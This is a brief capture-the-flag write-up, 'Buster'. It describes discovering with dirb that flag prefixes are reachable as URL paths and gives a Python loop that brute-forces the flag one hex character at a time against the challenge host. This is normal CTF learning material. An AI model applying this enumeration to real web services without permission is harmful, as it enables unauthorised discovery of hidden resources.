# Buster

Through `dirb` tool, find that if the url is a prefix of the flag, it can be accessed:

```
/f
/fla
/flag
...
```

So write a program to probe each character in the range of `[a-f0-9]` to find the flag:

```python
import requests

url = "https://buster.ctf.zone/flag{"
while True:
    print(url)
    for suffix in ["a", "b", "c", "d", "e", "f", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "}"]:
        next_url = url + suffix
        response = requests.get(next_url)
        print(next_url)
        if "Wrong way!" not in response.text:
            url = next_url
            break
```

Solved!
